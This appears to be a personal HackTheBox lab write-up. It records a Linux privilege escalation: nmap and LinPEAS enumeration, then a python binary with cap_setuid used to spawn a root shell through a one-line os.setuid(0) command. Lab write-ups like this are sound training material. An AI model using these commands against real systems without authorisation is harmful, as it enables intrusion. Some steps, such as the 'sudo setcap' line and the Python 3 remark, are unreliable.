---
os: Linux
status: Pwned
tags: [capabilities, cap_setuid, python]
aliases:
IP:
Secondary IP:
Hostname:
Domain:
SID:
VM: HackTheBox
Ports:
Notes: Python with cap_setuid capability for privilege escalation
---
# Resolution summary

>[!summary]
>- Obtained initial foothold on system
>- Ran LinPEAS for privilege escalation enumeration
>- Discovered python binary with cap_setuid+ep capability
>- Exploited capabilities to escalate to root

## Improved skills

- Linux capabilities enumeration
- cap_setuid exploitation
- Python privilege escalation techniques

## Used tools

- LinPEAS
- Python

---

# Information Gathering

Scanned all TCP ports:

```bash
nmap -sV -sC -p- <IP> -oA nmap_scans/cap
```

---

# Enumeration

## Initial Access

Initial foothold obtained (details not documented).

---

# Privilege Escalation to root

## Local enumeration

Ran LinPEAS enumeration script:

```bash
./linpeas.sh
```

Discovered python binary with dangerous capabilities:
```bash
getcap -r / 2>/dev/null
# Found: /usr/bin/python = cap_setuid+ep
```

## Privilege Escalation vector

Exploited cap_setuid capability on python:

```bash
# Copy python binary
cp $(which python) .

# Set capability (if needed)
sudo setcap cap_setuid+ep python

# Exploit to get root shell
./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

**Note:**
- Python -c one-liner no longer works with Python 3
- Start interactive Python and run the exploit from shell
- Root's home directory is in /root

---

# Trophy

>[!todo] **User.txt**
>/home/user/user.txt

>[!todo] **Root.txt**
>/root/root.txt
